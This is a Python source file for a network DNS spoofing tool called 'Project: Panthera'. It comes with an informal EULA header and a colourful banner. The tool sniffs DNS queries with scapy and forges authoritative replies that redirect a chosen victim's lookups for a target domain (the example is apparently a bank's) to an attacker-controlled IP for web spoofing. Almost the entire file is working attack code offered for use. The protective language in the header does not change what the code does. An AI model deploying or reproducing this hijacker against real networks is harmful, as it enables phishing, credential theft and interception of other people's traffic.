# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #

#!/usr/bin/env python
import argparse, os, sys, threading
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

cmd = "clear"
returned_value = os.system(cmd)
sys.stdout.write("\033[1;31m")
print "\n\n                                                                Project: Panthera"
print "\n						        	Coder: Haroon Awan\n\n"
sys.stdout.write("\033[1;33m")
print "[ + ] Version: 		Open Source Edition 1.0a\n"
print "[ + ] Contact: 		mrharoonawan@gmail.com\n"
print "[ + ] Environment: 	Python under Kali Linux\n"
print "[ + ] Github: 		Https://www.github.com/haroonawanethicalhacker\n"
print "[ + ] Design Scheme: 	Network based DNS hijacker for web spoofing\n"
print "[ + ] Example Usage:    python network_Dns_spoofer.py -d bop.com.pk -i wlan0 -t 192.168.1.45 -r 192.168.1.124\n\n"

sys.stdout.write("\033[0;32m")
print "\n[ + ] Contacting target ...\n";
sleep (2);
print "\n[ + ] Please wait, starting Network based DNS hijacker for web spoofing ...\n";
print "\n[ + ] Collecting output, it will take a minute or more, depending on the data ...\n\n";
def arg_parser():
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", dest="domain",    help="Fake URL for spoofing (default: all)")
	parser.add_argument("-i", dest="interface", help="Ethernet Interface for listening (default: default)")
	parser.add_argument("-t", dest="target",    help="Target's IP address to spoof. If not specified (default: all)")
	parser.add_argument("-r", dest="ip",    help="Source IP foring redirect the target (default: local IP)")
	return parser.parse_args()

def forge_packet(pkt, ip):
	RR_TTL = 60
	forged_DNSRR = DNSRR(rrname=pkt[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=ip)
	forged_pkt =  IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
	             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /\
	             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=forged_DNSRR)
	return forged_pkt

def packet_handler(pkt, domain, target, ip):
	# Check whether it's a DNS query
	if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
		# Check whether the domain is correct
		if domain is None or domain == pkt[DNS].qd.qname.decode('UTF-8'):
			# Check whether the query comes from the victim
			if target is None or pkt[IP].src == target:
				forged_pkt = forge_packet(pkt, ip)
				print("[*] Sending forged DNS for '%s' that '%s' was at '%s'." % (pkt[IP].src, pkt[DNS].qd.qname.decode('UTF-8'), ip))
				send(forged_pkt, verbose=0)

def DNS_spoof(interface, domain, target, ip, stop_event):
	while not stop_event.is_set():
		sniff(iface=interface, prn=lambda pkt: packet_handler(pkt, domain, target, ip), store=0, count=1)

def main():
	# Parse the arguments
	args = arg_parser()
	interface = args.interface
	if interface is None:
		interface = scapy.all.conf.iface
	target = args.target
	domain = args.domain
	if domain is not None and domain[-1] != '.':
		domain = domain+'.'
	ip = args.ip
	# If no IP has been set, use the local one
	if ip is None:
		ip = [x[4] for x in scapy.all.conf.route.routes if (x[2] != "0.0.0.0" and x[3] == interface)][0]
	
	# Creating the DNS spoofing thread
	stop_event = threading.Event()
	dns=threading.Thread(target=DNS_spoof, args=(interface, domain, target, ip, stop_event))
	dns.start()

	# Wait for the user to end the attack
	try:
		while True:
			sleep(0.1)
	except KeyboardInterrupt:
		# Stop the threads (ARP and DNS spoofing)
		stop_event.set()

	# Leave
	dns.join()
#	print("Exiting!")
        print('\x1b[6;30;42m' + 'Exiting!' + '\x1b[0m')

if __name__ == "__main__":
    main()
